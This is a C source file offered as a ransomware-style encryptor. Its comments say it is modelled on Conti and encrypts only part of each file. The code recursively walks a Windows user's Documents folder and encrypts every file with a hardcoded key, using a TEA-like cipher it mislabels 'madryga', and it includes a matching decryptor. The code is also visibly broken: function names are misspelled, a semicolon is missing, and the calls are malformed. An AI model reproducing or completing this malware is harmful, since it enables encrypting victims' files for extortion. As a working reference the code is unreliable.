/* 
The problem with madryga.c is that it would take way too long to encrypt everything in
a folder. So instead, this version, will only partially encrypt every file. 
Similar to Conti ransomware. */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>

#define ROUNDS 32

typedef uint32_t u32;

u32 key[4] = {0x23423423, 0x45645645, 0x67867867, 0x89A89A89};

// Encrypt folder Logic
void handleFiles(const char* folderPath) {
    // Get all files in folder
    WIN32_FIND_DATAA findFileData;
    char searchPath[MAX_PATH];
    sprintf(searchPath, MAX_PATH, "%s\\", folderPath);

    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error: Could not find folder %s\n. Code: %d", folderPath, GetLastError());
        return;
    }

    do {
        const char* fileName = findFileData.cFileName;
        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
            continue;
        }

        char filePath[MAX_PATH];
        sprintf(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            handleFiles(filePath); // recursive call for subfolders
        } else {
            // Process individual files
            printf("file: %s\n", filePath);
            char encryptedFilePath[MAX_PATH];
            sprinf_s(encryptedFilePath, MAX_PATH, "%s.bin", filePath);
            // Will begin madryga encryption here
            encrypt_file(filePath, encryptedFilePath);
        } 
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}
// Decrypt folder Logic
void decryptFiles(const char* folderPath) {
  WIN32_FIND_DATAA findFileData;
  char searchPath[MAX_PATH];
  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);

  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

  if (hFind == INVALID_HANDLE_VALUE) {
    printf("error: %d\n", GetLastError());
    return;
  }

  do {
    const char* fileName = findFileData.cFileName;

    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    char filePath[MAX_PATH];
    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      // Recursive call for subfolders
      decryptFiles(filePath);
    } else {
      // Process individual files
      if (strstr(fileName, ".bin") != NULL) {
        printf("File: %s\n", filePath);
        char decryptedFilePath[MAX_PATH];
        sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
         // Will begin madryga decryption here
        decrypt_file(filePath, decryptedFilePath);
      }
    }

  } while (FindNextFileA(hFind, &findFileData) != 0);

  FindClose(hFind);
}

void madryga_encrypt(u32 *v, u32 *k) {
    u32 v0=v[0], v1=v[1], sum=0, i;
    u32 delta=0x9e3779b9;
    for ( i = 0; i < ROUNDS; i++) {
        sum += delta;
        v0 += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        v1 += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
    }
    v[0]=v0; v[1]=v1;
}

void madryga_decrypt(u32 *v, u32 *k) {
    u32 v0=v[0], v1=v[1], sum=0xC6EF3720, i;
    u32 delta=0x9e3779b9;
    for ( i = 0; i < ROUNDS; i++) {
        v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        sum -= delta;
    }
    v[0]=v0; v[1]=v1;
}
// take pointer to data and it's length
void madryga_encrypt_data(unsigned char *data, int data_len) {
    int i;
    uint32_t *ptr = (uint32_t *)data; // cast to uint32_t pointer for 4 byte block processing
    for (i = 0; i < data_len; i += 8) {
        madryga_encrypt(ptr, key);
        ptr += 2;
    }
    // check for remaining bytes
    int remaining = data_len % 8;
    if (remaining != 0) {
        // pad with NOPs
        unsigned char pad[8] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
        memcpy(pad, ptr, remaining);
        madryga_encrypt((uint32_t *)pad, key); // encrypt with the padded block
        memcpy(ptr, pad, remaining);
    }
}

void madryga_decrypt_data(unsigned char *data, int data_len) {
    int i;
    uint32_t *ptr = (uint32_t *)data;
    for (i = 0; i < data_len / 8; i++) {
        madryga_decrypt(ptr, key);
        ptr += 2;
    }
    // check for remaining bytes
    int remaining = data_len % 8;
    if (remaining != 0) {
        // pad with NOPs
        unsigned char pad[8] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
        memcpy(pad, ptr, remaining);
        madryga_decrypt((uint32_t *)pad, key);
        memcpy(ptr, pad, remaining);
    }
}

// file encryption and decryption logic
void encrypt_file(const char* input_path, const char* output_path) {
    FILE* input_file = fopen(input_path, "rb");
    FILE* output_file = fopen(output_path, "wb");

    if (!input_file || !output_file) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }
    
    fseek(input_file, 0, SEEK_END);
    long file_size = ftell(input_file);
    fseek(input_file, 0, SEEK_SET);

    unsigned char* file_contents = (unsigned char*)malloc(file_size);
    fread(file_contents, 1, file_size, input_file);

    for (int i = 0; i < file_size / 8; i++) {
        madryga_encrypt_data(file_contents + i * 8, 8);
    }

    fwrite(file_contents, 1, file_size, output_file);

    fclose(input_file);
    fclose(output_file);
    free(file_contents);
}

void decrypt_file(const char* input_path, const char* output_path) {
    FILE* input_file = fopen(input_path, "rb");
    FILE* output_file = fopen(output_path, "wb");

    if (!input_file || !output_file) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }

    fseek(input_file, 0, SEEK_END);
    long file_size = ftell(input_file);
    fseek(input_file, 0, SEEK_SET);

    unsigned char* file_contents = (unsigned char*)malloc(file_size);
    fread(file_contents, 1, file_size, input_file);

    for (int i = 0; i < file_size / 8; i++) {
        madryga_decrypt_data(file_contents + i * 8, 8);
    }

    fwrite(file_contents, 1, file_size, output_file);

    fclose(input_file);
    fclose(output_file);
    free(file_contents);
}

int main() {
    const char* rootFolder = "C:\\Users\\user\\Documents";
    handleFiles(rootFolder)
    decryptFiles(rootFolder);
    return 0;
}